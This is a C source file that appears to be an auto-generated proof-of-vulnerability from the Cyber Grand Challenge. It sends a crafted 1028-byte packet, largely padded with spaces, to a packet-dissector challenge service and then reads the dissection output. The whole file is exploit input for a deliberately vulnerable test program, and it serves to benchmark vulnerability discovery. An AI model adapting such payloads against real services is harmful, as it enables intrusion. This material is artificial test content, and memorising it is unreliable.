#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xc4\x7a\x8d\x61"
         "\x08\x12\xf0\x08\x4f\xf3\x7e\x2c\xbc\x00\xca\xfa\x4d\x66\xe0\x3c"
         "\xa7\x00\x00\x00\x43\x90\x85\x5e\xe0\xde\x12\x1d\x60\xd5\x84\x82"
         "\x09\xb3\xb9\x86\x90\x69\x86\xa0\xd2\xc6\x3a\x72\x0f\xad\xf3\xdf"
         "\x90\xaa\xbd\x12\x06\xc4\x7c\xc8\xce\x1a\xb8\x28\x48\xf3\x04\x4a"
         "\x0d\xee\xdd\x13\x6d\x51\xaa\x24\x7e\xa0\x9e\xe8\x04\x76\xa3\x3f"
         "\x36\x8f\x1a\xeb\xff\x13\x61\x61\x7a\x67\x54\xc9\x9e\xff\x31\x38"
         "\xc3\xdb\xa9\x91\x52\x95\xed\xb8\xa2\xce\xa6\x46\x91\x9e\x7f\x61"
         "\xc2\x88\x0e\x8c\x4f\xbe\x4b\xe0\xd3\x76\x1e\xa5\xd5\xb0\x13\x17"
         "\xb8\x34\x35\xe3\x4d\x45\x99\xda\x0c\x99\x83\x78\x30\x6c\x20\x86"
         "\xb2\xdd\x60\xb2\x76\x3f\x8f\x23\xc1\x09\x2d\xbd\x35\xee\xa5\x3f"
         "\x3d\xd0\x34\xdf\xde\x5f\x64\xc4\x34\x17\x23\x46\x59\x9b\xf4\xd9"
         "\xe5\x7b\xc1\xd9\xbe\xd9\xaa\xe2\x4c\x70\xd1\x21\x0e\x20\x0a\xd2"
         "\x45\x1a\xc1\xac\xd7\x02\x59\xf9\xe4\x7e\x43\x13\xb8\x90\xfa\xc4"
         "\xd6\x61\xe5\xd9\x77\xed\xf8\x14\x46\x53\x4f\x0e\xee\x10\x25\xaf"
         "\x47\xe0\x6f\x45\x13\x28\x15\xd3\x63\x82\x3c\xfb\x9b\xc9\x4f\x6e"
         "\x30\x24\x40\xfd\xdc\x54\x9c\xab\xfa\x97\x4c\x2d\xe9\x6f\x12\xc4"
         "\x85\x4a\x69\x3b\x20\x2a\xcb\x8b\x2f\xe1\x61\xf3\x6f\x52\x77\x02"
         "\x81\xa0\x5b\xdf\x65\x2e\x90\x53\x3a\xc4\x16\x40\x7a\x9c\x31\x3b"
         "\x18\x6e\x0e\x4b\x9d\xfc\xed\xbc\xf2\x5f\xcc\x68\x7f\x33\x68\x2b"
         "\x88\xc2\xce\xcb\xe6\x88\x0b\x90\x7d\x53\xad\x67\x80\x47\xa0\x13"
         "\xcd\x3a\xdf\x69\x0f\x8a\x72\x56\x1f\x87\xef\xa8\x0a\x07\x3f\x0f"
         "\x00\x94\xd8\xd0\xad\xab\x7c\x62\xf2\xbc\x79\xe0\x06\x08\x9c\x29"
         "\xa3\xec\x5d\x97\xf4\x85\x4b\x00\x3b\xef\xb5\x92\x8f\x61\x0c\x2f"
         "\xfc\xd2\x8f\xc0\x93\x34\xfb\x6d\xa1\xd8\xac\xb4\x4d\xaf\x5f\xfd"
         "\x89\x39\x9e\x99\x03\x4a\x2e\xc2\x4d\xfd\xd4\x1a\x01\x00\x82\x2d"
         "\x36\x93\xf7\x7e\x91\x2f\xf2\xb3\x77\x96\x7b\xf6\x3c\xfa\x22\x17"
         "\x0a\x6d\x4f\xae\x10\x55\xce\xa8\x12\x53\xb0\x3d\xd9\xc8\xe2\xeb"
         "\x25\x9c\x4a\x8e\xfa\x2d\x49\xf1\x77\xa4\x88\xc7\xed\x52\x22\x8a"
         "\x64\xeb\xcf\xc8\xe7\x4b\x64\xcc\x39\x9e\x2a\x5a\xce\xc2\xc7\x9d"
         "\xa4\x10\x83\x0e\xe9\x9a\x7f\x47\x32\xaa\xe9\x5d\x4a\x85\x6f\x30"
         "\x8c\xd9\xd2\xd0\x22\x3b\x53\x59\x3a\x98\x60\xd0\xc9\xc1\xff\x0c"
         "\xc4\x41\x05\xef\xa3\x43\xb2\xdc\x38\xb3\x01\x6e\x04\x0f\x0f\xaa"
         "\x6e\xe9\xf3\x13\x6d\xdb\x32\x15\xd9\x8f\xdd\x76\xa0\xa9\xf8\xc2"
         "\xbe\x6f\xc4\x63\xcd\x21\xf5\x9f\x52\x78\x16\x87\xa2\x87\x81\x37"
         "\xd8\x6a\xc0\xd1\xe7\x76\x71\x31\xd8\x5a\x0b\x30\x5a\x28\xcf\xb7"
         "\xd8\xd9\xa2\xe2\x06\x7e\x68\xcb\x5b\x27\x13\x59\x31\x9b\x58\x6b"
         "\x8d\x75\x28\x2f\xac\x81\x5b\x0f\x0f\x00\xb8\x62\x58\x1e\x4b\xfa"
         "\xd9\xdf\x59\x06\xe5\x43\x5c\x5f\xc2\x83\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===syphilologyannularity
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x73\x79\x70\x68\x69\x6c\x6f\x6c\x6f\x67\x79"
         "\x61\x6e\x6e\x75\x6c\x61\x72\x69\x74\x79";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
